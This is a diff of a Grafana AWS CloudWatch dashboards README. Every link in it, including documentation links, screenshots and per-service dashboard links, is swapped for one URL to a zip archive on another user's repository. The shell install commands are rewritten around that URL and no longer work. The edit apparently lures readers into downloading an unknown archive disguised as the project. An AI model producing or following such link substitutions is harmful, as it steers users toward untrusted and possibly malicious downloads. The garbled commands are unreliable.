@@ -1,14 +1,14 @@
-[<img src="https://monitoringartist.github.io/managed-by-monitoringartist.png" alt="Managed by Monitoring Artist: DevOps / Docker / Kubernetes / AWS ECS / Zabbix / Zenoss / Terraform / Monitoring" align="right"/>](http://www.monitoringartist.com 'DevOps / Docker / Kubernetes / AWS ECS / Zabbix / Zenoss / Terraform / Monitoring')
+[<img src="https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip" alt="Managed by Monitoring Artist: DevOps / Docker / Kubernetes / AWS ECS / Zabbix / Zenoss / Terraform / Monitoring" align="right"/>](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip 'DevOps / Docker / Kubernetes / AWS ECS / Zabbix / Zenoss / Terraform / Monitoring')
 
 # Grafana dashboards for AWS CloudWatch
 
 Set of AWS Grafana dashboards published on
-[grafana.com](https://grafana.com/dashboards?dataSource=cloudwatch) -
+[https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) -
 10M+ downloads.
 
 Doc:
-- [Cloudwatch datasource configuration](https://grafana.com/docs/grafana/latest/datasources/cloudwatch/)
-- [Grafana doc](https://grafana.com/docs/)
+- [Cloudwatch datasource configuration](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+- [Grafana doc](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
 Feel free to create pull request for additional AWS resources/printscreens/...
 
@@ -41,7 +41,7 @@ for d in "${ds[@]}"; do
 done
 ```
 
-Use [AWS Policy Generator](http://awspolicygen.s3.amazonaws.com/policygen.html),
+Use [AWS Policy Generator](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip),
 which fits your needs. Example of minimal IAM role for Grafana (CloudWatch + EC2 metrics):
 
 ```
@@ -81,137 +81,137 @@ which fits your needs. Example of minimal IAM role for Grafana (CloudWatch + EC2
 }
 ```
 
-You can also install this project as a Jsonnet library with [jsonnet-bundler](https://github.com/jsonnet-bundler/jsonnet-bundler):
+You can also install this project as a Jsonnet library with [jsonnet-bundler](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip):
 
 ```shell
-$ jb install github.com/monitoringartist/grafana-aws-cloudwatch-dashboards
-$ cat > aws-cloudwatch-dashboards.jsonnet <<EOF
-local awsCloudWatch = import 'github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/dashboards.libsonnet';
+$ jb install https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip
+$ cat > https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip <<EOF
+local awsCloudWatch = import 'https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip';
 
-awsCloudWatch.grafanaDashboards
+https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip
 EOF
-$ jsonnet -J vendor aws-cloudwatch-dashboards.jsonnet
+$ jsonnet -J vendor https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip
 ```
 
-Single click provisioning [![Gitpod ready-to-test](https://img.shields.io/badge/Gitpod-ready--to--test-blue?logo=gitpod)](https://gitpod.io/#https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/) - login as `admin/admin` and create CloudWatch datasource from your `Access & secret key` to see all dashboards with your data.
+Single click provisioning [![Gitpod ready-to-test](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) - login as `admin/admin` and create CloudWatch datasource from your `Access & secret key` to see all dashboards with your data.
 
-### [AWS API Gateway](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-api-gateway)
-[![AWS API Gateway](aws-api-gateway/aws-api-gateway.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-api-gateway)
+### [AWS API Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS API Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Auto Scaling](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-autoscaling)
+### [AWS Auto Scaling](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Billing](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-billing)
-[![AWS Billing](aws-billing/aws-billing.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-billing)
+### [AWS Billing](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Billing](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Certificate Manager](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-certificate-manager)
-[![AWS Certificate Manager](aws-certificate-manager/aws-certificate-manager.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-certificate-manager)
+### [AWS Certificate Manager](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Certificate Manager](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS CloudFront](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudfront)
-[![AWS CloudFront](aws-cloudfront/aws-cloudfront.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudfront)
+### [AWS CloudFront](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS CloudFront](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS CloudWatch Browser](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudwatch-browser)
-[![AWS Cloudwatch Browser](aws-cloudwatch-browser/aws-cloudwatch-browser.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudwatch-browser)
+### [AWS CloudWatch Browser](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Cloudwatch Browser](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS CloudWatch Synthetics](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudwatch-synthetics)
-[![AWS Cloudwatch Synthetics](aws-cloudwatch-synthetics/aws-cloudwatch-synthetics.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudwatch-synthetics)
+### [AWS CloudWatch Synthetics](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Cloudwatch Synthetics](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS CloudWatch Usage Metrics](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudwatch-usage-metrics)
-[![AWS Cloudwatch Browser](aws-cloudwatch-usage-metrics/aws-cloudwatch-usage-metrics.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cloudwatch-usage-metrics)
+### [AWS CloudWatch Usage Metrics](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Cloudwatch Browser](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS CodeBuild](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-codebuild)
-[![AWS CodeBuild](aws-codebuild/aws-codebuild.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-codebuild)
+### [AWS CodeBuild](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS CodeBuild](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Cognito](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-cognito)
+### [AWS Cognito](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS EBS](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-ebs)
-[![AWS EBS](aws-ebs/aws-ebs.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-ebs)
+### [AWS EBS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS EBS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS EC2](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-ec2)
-[![AWS EC2](aws-ec2/aws-ec2.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-ec2)
+### [AWS EC2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS EC2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS ECS](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-ecs)
-[![AWS ECS](aws-ecs/aws-ecs.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-ecs)
+### [AWS ECS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS ECS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS EFS](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-efs)
-[![AWS EFS](aws-efs/aws-efs.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-efs)
+### [AWS EFS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS EFS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS EKS](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-eks)
+### [AWS EKS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS ElastiCache Redis](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-elasticache)
-[![AWS ElastiCache Redis](aws-elasticache/aws-elasticache-redis.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-elasticache)
+### [AWS ElastiCache Redis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS ElastiCache Redis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS ELB Classic Load Balancer](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-elb)
-[![AWS ELB Classic Load Balancer](aws-elb/aws-elb-classic-lb.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-elb)
+### [AWS ELB Classic Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS ELB Classic Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS ELB Application Load Balancer](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-elb)
-[![AWS ELB Application Load Balancer](aws-elb/aws-elb-application-lb.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-elb)
+### [AWS ELB Application Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS ELB Application Load Balancer](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS EMR Hadoop 2](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-emr)
-[![AWS EMR Hadoop 2](aws-emr/aws-emr-hadoop-2.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-emr)
+### [AWS EMR Hadoop 2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS EMR Hadoop 2](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Events](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-events)
-[![AWS Events](aws-events/aws-events.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-events)
+### [AWS Events](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Events](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Inspector](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-inspector)
-[![AWS Inspector](aws-inspector/aws-inspector.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-inspector)
+### [AWS Inspector](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Inspector](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Kinesis](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-kinesis)
-[![AWS Kinesis](aws-kinesis/aws-kinesis.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-kinesis)
+### [AWS Kinesis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Kinesis](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Lambda](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-lambda)
-[![AWS Lambda](aws-lambda/aws-lambda.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-lambda)
+### [AWS Lambda](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Lambda](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Logs](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-logs)
-[![AWS Logs](aws-logs/aws-logs.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-logs)
+### [AWS Logs](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Logs](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Network Firewall](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-network-firewall)
-[![AWS Network Firewall](aws-network-firewall/aws-network-firewall.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-network-firewall)
+### [AWS Network Firewall](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Network Firewall](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS RDS](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-rds)
-[![AWS RDS](aws-rds/aws-rds.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-rds)
+### [AWS RDS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS RDS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Redshift](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-redshift)
-[![AWS Redshift](aws-redshift/aws-redshift.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-redshift)
+### [AWS Redshift](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Redshift](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Route 53](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-route-53)
+### [AWS Route 53](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS S3](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-s3)
-[![AWS S3](aws-s3/aws-s3.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-s3)
+### [AWS S3](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS S3](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS SES](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-ses)
+### [AWS SES](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS SNS](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-sns)
-[![AWS SNS](aws-sns/aws-sns.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-sns)
+### [AWS SNS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS SNS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS SQS](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-sqs)
-[![AWS SQS](aws-sqs/aws-sqs.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-sqs)
+### [AWS SQS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS SQS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Step Functions](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-step-functions)
-[![AWS SNS](aws-step-functions/aws-step-functions.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-step-functions)
+### [AWS Step Functions](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS SNS](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Storage Gateway](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-storage-gateway)
-[![AWS Storage Gateway](aws-storage-gateway/aws-storage-gateway.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-storage-gateway)
+### [AWS Storage Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Storage Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS Transit Gateway](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-transit-gateway)
-[![AWS Transit Gateway](aws-transit-gateway/aws-transit-gateway.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-transit-gateway)
+### [AWS Transit Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS Transit Gateway](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS VPN](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-vpn)
+### [AWS VPN](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
-### [AWS X-Ray](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-x-ray)
